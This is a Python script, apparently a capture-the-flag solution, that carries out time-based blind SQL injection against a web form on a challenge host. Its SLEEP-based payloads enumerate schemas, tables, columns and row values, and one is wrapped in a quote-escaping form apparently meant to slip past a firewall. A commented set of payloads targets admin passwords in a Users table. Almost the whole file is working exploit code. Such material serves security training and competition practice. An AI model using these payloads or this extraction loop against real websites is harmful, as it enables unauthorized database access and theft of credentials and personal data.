import requests
from search.deep_error_search import deep_error_search, string_to_hexstring as s2h
from search.deep_time_search import deep_time_search
from search.linear_time_search import linear_time_search
from search.offset_time_search import offset_time_search


# db
# QUERY = "SELECT SLEEP({0}) FROM information_schema.schemata WHERE HEX(schema_name) LIKE 0x{1}25"
# QUERY = "SELECT 1=1 FROM information_schema.schemata WHERE HEX(schema_name) LIKE 0x{}25"
# table
# QUERY = "SELECT SLEEP({0}) FROM information_schema.tables WHERE HEX(table_name) LIKE 0x{1}25 AND table_schema = DATABASE()"
# QUERY = "SELECT SLEEP({0}) FROM information_schema.tables WHERE HEX(table_name) LIKE 0x{1}25 AND table_type = 0x" + s2h('BASE TABLE')
# column
# QUERY = "SELECT SLEEP({0}) FROM information_schema.columns WHERE HEX(column_name) LIKE 0x{1}25 AND table_name = 0x" + s2h('Logs')
# value
QUERY = "SELECT SLEEP({0}) FROM Logs WHERE HEX(ips) LIKE 0x{1}25"

QUERY = f"\\' LIKE ({QUERY}) ) -- "
TIME = .4


def send_request(value:str):
  url = "http://modinsecurity.challs.cyberchallenge.it:80/"
  data = {"name": "a", "email": "a@gmail.com", "phone": "a", "message": QUERY.format(TIME, s2h(value))}
  r = requests.post(url, data=data)
  blocked = 'Your request have been blocked!' in r.text
  error = '[MySQL Error]' in r.text
  # print('blocked:', blocked)
  # print('error:', error)
  if blocked and error:
    # print('response:', r.text)
    return True

print(deep_time_search(send_request, TIME, ''))





# db
QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.schemata WHERE HEX(schema_name) LIKE '{}%') -- "
# table
# QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.tables WHERE HEX(table_name) LIKE '{}%' AND table_schema = DATABASE()) -- "
# column
# QUERY = "' AND (SELECT SLEEP({}) FROM information_schema.columns WHERE HEX(column_name) LIKE '{}%' AND table_name = 'Users') -- "
# value
# QUERY = "' AND (SELECT SLEEP({}) FROM Users WHERE HEX(pwd) LIKE '{}%' AND isAdmin=1) -- "
# QUERY = ""
TIME = .4


